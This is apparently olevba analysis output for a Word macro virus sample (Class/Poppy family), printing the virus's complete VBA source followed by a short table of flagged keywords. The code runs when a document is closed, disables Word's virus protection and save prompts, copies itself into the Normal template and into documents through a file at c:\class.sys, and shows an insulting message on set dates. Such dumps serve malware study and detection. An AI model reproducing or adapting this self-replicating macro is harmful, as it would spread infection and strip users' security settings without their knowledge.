olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-f20d8e529da04aa8c75d9814e2be13d8098a160c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-f20d8e529da04aa8c75d9814e2be13d8098a160c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Tester2/26/01 11:40:24 AMtest.docClippit
On Error GoTo out
'Tester2/26/01 11:40:24 AMtest.docClippit
Options.VirusProtection = False
'Tester2/26/01 11:40:24 AMtest.docClippit
Options.SaveNormalPrompt = False
'Tester2/26/01 11:40:24 AMtest.docClippit
Options.ConfirmConversions = False
'Tester2/26/01 11:40:24 AMtest.docClippit
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Tester2/26/01 11:40:24 AMtest.docClippit
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Tester2/26/01 11:40:24 AMtest.docClippit
If nt > 70 And ad > 0 Then GoTo out
'Tester2/26/01 11:40:24 AMtest.docClippit
If nt < 70 Then
'Tester2/26/01 11:40:24 AMtest.docClippit
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Tester2/26/01 11:40:24 AMtest.docClippit
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Tester2/26/01 11:40:24 AMtest.docClippit
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Tester2/26/01 11:40:24 AMtest.docClippit
End If
'Tester2/26/01 11:40:24 AMtest.docClippit
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Tester2/26/01 11:40:24 AMtest.docClippit
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Tester2/26/01 11:40:24 AMtest.docClippit
host.codemodule.AddFromFile ("c:\class.sys")
'Tester2/26/01 11:40:24 AMtest.docClippit
With host.codemodule
'Tester2/26/01 11:40:24 AMtest.docClippit
    For x = 1 To 4
'Tester2/26/01 11:40:24 AMtest.docClippit
    .deletelines 1
'Tester2/26/01 11:40:24 AMtest.docClippit
    Next x
'Tester2/26/01 11:40:24 AMtest.docClippit
End With
'Tester2/26/01 11:40:24 AMtest.docClippit
If nt < 70 Then
'Tester2/26/01 11:40:24 AMtest.docClippit
    With host.codemodule
'Tester2/26/01 11:40:24 AMtest.docClippit
    .replaceline 1, "Sub AutoClose()"
'Tester2/26/01 11:40:24 AMtest.docClippit
    .replaceline 71, "Sub ToolsMacro()"
'Tester2/26/01 11:40:24 AMtest.docClippit
    End With
'Tester2/26/01 11:40:24 AMtest.docClippit
End If
'Tester2/26/01 11:40:24 AMtest.docClippit
With host.codemodule
'Tester2/26/01 11:40:24 AMtest.docClippit
    For x = 2 To 72 Step 2
'Tester2/26/01 11:40:24 AMtest.docClippit
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'Tester2/26/01 11:40:24 AMtest.docClippit
    Next x
'Tester2/26/01 11:40:24 AMtest.docClippit
End With
'Tester2/26/01 11:40:24 AMtest.docClippit
out:
'Tester2/26/01 11:40:24 AMtest.docClippit
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Tester2/26/01 11:40:24 AMtest.docClippit
End Sub
'Tester2/26/01 11:40:24 AMtest.docClippit
Sub ToolsMacro()
'Tester2/26/01 11:40:24 AMtest.docClippit
End Sub


Private Sub Document_New()

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

